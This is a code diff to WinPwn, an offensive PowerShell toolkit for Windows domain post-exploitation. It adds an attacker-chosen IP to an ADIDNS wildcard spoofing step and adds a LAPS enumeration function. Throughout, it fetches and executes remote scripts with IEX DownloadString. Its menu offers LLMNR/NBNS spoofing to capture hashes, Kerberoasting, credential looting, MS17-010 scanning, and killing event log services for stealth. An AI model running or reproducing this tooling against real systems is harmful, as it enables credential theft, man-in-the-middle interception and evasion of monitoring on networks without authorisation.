@@ -348,7 +348,8 @@ function adidnswildcard
     if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
     {
         IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Powermad.ps1")
-        New-ADIDNSNode -Node * -Tombstone -Verbose
+        $target = read-host "Please enter the IP-Adress for the wildcard entry"
+	New-ADIDNSNode -Node * -Tombstone -Verbose -data $target
         Write-Host -ForegroundColor Red 'Be sure to remove the record with `Disable-ADIDNSNode -Node * -Verbose` at the end of your tests'
         Write-Host -ForegroundColor Yellow 'Starting Inveigh to capture all theese mass hashes:'
         Inveigh
@@ -1031,6 +1032,9 @@ function domainreconmodules
 	        rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        }
             
+	     Write-Host -ForegroundColor Yellow 'Searching for LAPS Administrators'
+            lapschecks
+	    
             function spoolvulnscan{
             
 	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
@@ -1900,6 +1904,19 @@ Function Get-Installedsoftware {
     }
 }
 
+function lapschecks
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/LAPSToolkit.ps1')
+    Write-Host "Checking for LAPS enabled Computers."
+    Get-LAPSComputers >> "$currentPath\DomainRecon\LapsInformations.txt"
+    Write-Host "Checking for LAPS Administrator groups."
+    Find-LAPSDelegatedGroups >> "$currentPath\DomainRecon\LapsAllowedAdminGroups.txt"
+    Write-Host "Checking for special right users with access to laps passwords."
+    Find-AdmPwdExtendedRights >> "$currentPath\DomainRecon\LapsSpecialRights.txt"
+}
+
 function fruit
 {
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
@@ -1930,23 +1947,23 @@ __        ___       ____
 
     do
     {
-        Write-Host "================ WinPwn ================"
+       Write-Host "================ WinPwn ================"
         Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNS/LLMNR/mDNS/NBNS spoofer! '
-        Write-Host -ForegroundColor Green '2. Start local recon modules! '
-        Write-Host -ForegroundColor Green '3. Start domain recon modules! '
-        Write-Host -ForegroundColor Green '4. Try to escalate my local privileges! '
-        Write-Host -ForegroundColor Green '5. Kerberoast some service accounts! '
-        Write-Host -ForegroundColor Green '6. Search for SQL Servers in the domain and pwn them if possible! '
+        Write-Host -ForegroundColor Green '2. Local recon menu! '
+        Write-Host -ForegroundColor Green '3. Domain recon menu! '
+        Write-Host -ForegroundColor Green '4. Local privilege escalation checks! '
+        Write-Host -ForegroundColor Green '5. Kerberoasting! '
+        Write-Host -ForegroundColor Green '6. PowerUpSQL checks! '
         Write-Host -ForegroundColor Green '7. Collect Bloodhound information! '
-        Write-Host -ForegroundColor Green '8. Search for MS17-10 vulnerable Servers / Clients in this domain! '
-        Write-Host -ForegroundColor Green '9. Give me some Credentials, now! '
+        Write-Host -ForegroundColor Green '8. MS17-10 domain system scanner! '
+        Write-Host -ForegroundColor Green '9. Loot local Credentials! '
         Write-Host -ForegroundColor Green '10. Search for Systems with Admin-Access to pwn them! '
-        Write-Host -ForegroundColor Green '11. Create an ADIDNS Wildcard for ultimate mitm in all networks! '
-        Write-Host -ForegroundColor Green '12. Execute Sessiongopher! '
-        Write-Host -ForegroundColor Green '13. I want to check some remote system groups via GPO Mapping! '
-        Write-Host -ForegroundColor Green '14. I am local admin, kill the event log services for stealth! '
+        Write-Host -ForegroundColor Green '11. Create an ADIDNS Wildcard! '
+        Write-Host -ForegroundColor Green '12. Sessiongopher! '
+        Write-Host -ForegroundColor Green '13. Check remote system groups via GPO Mapping! '
+        Write-Host -ForegroundColor Green '14. Kill the event log services for stealth! '
         Write-Host -ForegroundColor Green '15. Search for passwords on this system! '
-        Write-Host -ForegroundColor Green '16. Just one ADRecon Report for me! '
+        Write-Host -ForegroundColor Green '16. ADRecon Report! '
         Write-Host -ForegroundColor Green '17. Search for potential vulnerable web apps (low hanging fruits)! '
         Write-Host -ForegroundColor Green '18. Find some network shares! '
 	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
